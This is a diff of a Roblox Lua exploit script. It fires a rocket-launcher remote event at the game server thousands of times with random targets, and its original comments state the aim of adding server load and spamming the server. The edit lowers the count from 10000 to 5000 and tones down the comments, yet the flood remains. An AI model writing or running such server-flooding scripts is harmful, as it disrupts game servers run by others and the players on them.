@@ -1,14 +1,14 @@
-local numRockets = 10000 -- Increase the number of rockets for more server load
+local numRockets = 5000  -- Increase to 5000
 
 for i = 1, numRockets do
     local args = {
-        [1] = Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000)) -- Random target positions to increase processing load
+        [1] = Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000)) -- Random target positions
     }
 
-    -- Spam the server with rocket fire events
+    -- Fire the event
     game:GetService("Players").LocalPlayer.Character.RocketLauncher.BattleRocketEvent:FireServer(unpack(args))
-    
-    -- Add a small delay to avoid crashing yourself immediately
+
+    -- Delay every 500 rockets to prevent instant crashes
     if i % 500 == 0 then
         task.wait(0.01)
     end
